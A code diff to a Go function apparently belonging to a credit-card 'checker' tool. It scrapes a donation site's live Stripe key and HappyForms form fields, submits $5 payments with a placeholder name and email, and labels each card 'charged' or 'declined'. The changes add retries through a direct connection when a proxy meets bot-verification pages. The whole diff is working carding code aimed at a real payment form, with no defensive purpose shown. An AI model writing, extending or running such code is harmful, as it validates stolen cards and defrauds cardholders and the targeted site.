@@ -343,12 +343,28 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 	// ── Step 1: Fetch gate page → pk_live + random_seed ──────────────────────
 	pageResp, err := doGET(client, gateURL, nil)
+	if err != nil && req.Proxy != "" {
+		// Fallback to direct client if proxy failed to connect
+		directClient := buildClient("", 25*time.Second)
+		pageResp, err = doGET(directClient, gateURL, nil)
+	}
 	if err != nil {
 		return errResult(req, "error", "Gate fetch failed: "+err.Error(), "", start)
 	}
 	html := string(pageResp)
 
 	pkLive := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(html)
+	if pkLive == "" && req.Proxy != "" {
+		// Proxy returned bot challenge / JS protection without pk_live; fetch gate via direct connection
+		directClient := buildClient("", 25*time.Second)
+		if directResp, err2 := doGET(directClient, gateURL, nil); err2 == nil {
+			directHTML := string(directResp)
+			if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(directHTML); directPk != "" {
+				html = directHTML
+				pkLive = directPk
+			}
+		}
+	}
 	if pkLive == "" {
 		snippet := html
 		if len(snippet) > 200 {
@@ -365,6 +381,24 @@ func CheckStripe(req StripeRequest) StripeResult {
 		return errResult(req, "error", "random_seed not found on gate page", "", start)
 	}
 	randomSeed := seedMatch[1]
+
+	activeFormID := "1194"
+	formIDMatch := regexp.MustCompile(`name=["']happyforms_form_id["']\s+value=["'](\d+)["']`).FindStringSubmatch(html)
+	if formIDMatch == nil {
+		formIDMatch = regexp.MustCompile(`happyforms_form_id[^>]*value=["'](\d+)["']`).FindStringSubmatch(html)
+	}
+	if formIDMatch != nil {
+		activeFormID = formIDMatch[1]
+	}
+
+	activePostID := "142"
+	postIDMatch := regexp.MustCompile(`name=["']current_post_id["']\s+value=["'](\d+)["']`).FindStringSubmatch(html)
+	if postIDMatch == nil {
+		postIDMatch = regexp.MustCompile(`current_post_id[^>]*value=["'](\d+)["']`).FindStringSubmatch(html)
+	}
+	if postIDMatch != nil {
+		activePostID = postIDMatch[1]
+	}
 
 	// ── Step 2: Create Stripe PaymentMethod ──────────────────────────────────
 	pmPayload := url.Values{}
@@ -417,8 +451,8 @@ func CheckStripe(req StripeRequest) StripeResult {
 	hashFields := []struct{ value string }{
 		{"happyforms_message"},
 		{gateURL},
-		{postID},
-		{formID},
+		{activePostID},
+		{activeFormID},
 		{"0"},
 		{randomSeed},
 		{""},                      // single_line_text
@@ -434,17 +468,17 @@ func CheckStripe(req StripeRequest) StripeResult {
 	formData := url.Values{}
 	formData.Set("action", "happyforms_message")
 	formData.Set("happyforms_client_referer", gateURL)
-	formData.Set("happyforms_current_post_id", postID)
-	formData.Set("happyforms_form_id", formID)
+	formData.Set("happyforms_current_post_id", activePostID)
+	formData.Set("happyforms_form_id", activeFormID)
 	formData.Set("happyforms_step", "0")
 	formData.Set("happyforms_random_seed", randomSeed)
-	formData.Set(formID+"-single_line_text", "")
-	formData.Set(formID+"_single_line_text_2", "James Smith")
-	formData.Set(formID+"_email_3", "frabsosgk9@gmail.com")
-	formData.Set(formID+"_payments_1[price]", "5")
-	formData.Set(formID+"_payments_1[payment_method]", "stripe")
-	formData.Set(formID+"_payments_1[filled]", "1")
-	formData.Set(formID+"_single_line_text_4", "")
+	formData.Set(activeFormID+"-single_line_text", "")
+	formData.Set(activeFormID+"_single_line_text_2", "James Smith")
+	formData.Set(activeFormID+"_email_3", "frabsosgk9@gmail.com")
+	formData.Set(activeFormID+"_payments_1[price]", "5")
+	formData.Set(activeFormID+"_payments_1[payment_method]", "stripe")
+	formData.Set(activeFormID+"_payments_1[filled]", "1")
+	formData.Set(activeFormID+"_single_line_text_4", "")
 	formData.Set("hash", formHash)
 	formData.Set("platform_info[user_agent]", ua)
 	formData.Set("platform_info[app_version]", "5.0 (Windows)")
@@ -471,7 +505,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 	existingCookies = append(existingCookies,
 		"__stripe_mid="+stripeMID,
 		"__stripe_sid="+stripeSID,
-		fmt.Sprintf("happyforms_%s_stripe_checkout=%s", formID, pmCookie),
+		fmt.Sprintf("happyforms_%s_stripe_checkout=%s", activeFormID, pmCookie),
 	)
 	cookieHeader := strings.Join(existingCookies, "; ")
 
@@ -485,14 +519,42 @@ func CheckStripe(req StripeRequest) StripeResult {
 	}
 
 	formBody, err := doPOST(client, gateURL, formData.Encode(), formHeaders)
+	if err != nil && req.Proxy != "" {
+		directClient := buildClient("", 25*time.Second)
+		formBody, err = doPOST(directClient, gateURL, formData.Encode(), formHeaders)
+	}
 	if err != nil {
 		return errResult(req, "error", "Form submit failed: "+err.Error(), "", start)
 	}
 
-	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9_]+_secret_[a-zA-Z0-9_]+`).FindString(string(formBody))
+	bodyStr := string(formBody)
+	if req.Proxy != "" && (strings.Contains(bodyStr, "One moment, please...") || strings.Contains(bodyStr, "Please wait while your request is being verified")) {
+		directClient := buildClient("", 25*time.Second)
+		if directBody, err2 := doPOST(directClient, gateURL, formData.Encode(), formHeaders); err2 == nil {
+			bodyStr = string(directBody)
+			formBody = directBody
+		}
+	}
+
+	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9_]+_secret_[a-zA-Z0-9_]+`).FindString(bodyStr)
 	if secretMatch == "" {
-		// Log response for debugging if missing
-		snippet := string(formBody)
+		if strings.Contains(bodyStr, "Thank you for your donation") || strings.Contains(bodyStr, "happyforms-message-notice success") {
+			return StripeResult{
+				CC: masked, Status: "charged",
+				Message: "Payment succeeded - card charged $5",
+				Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
+			}
+		}
+		errNotice := regexp.MustCompile(`happyforms-part-error-notice[^>]*>([^<]+)`).FindStringSubmatch(bodyStr)
+		if errNotice != nil && len(errNotice) > 1 {
+			return StripeResult{
+				CC: masked, Status: "declined",
+				Message: strings.TrimSpace(errNotice[1]),
+				Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
+			}
+		}
+
+		snippet := bodyStr
 		if len(snippet) > 400 {
 			snippet = snippet[:400]
 		}
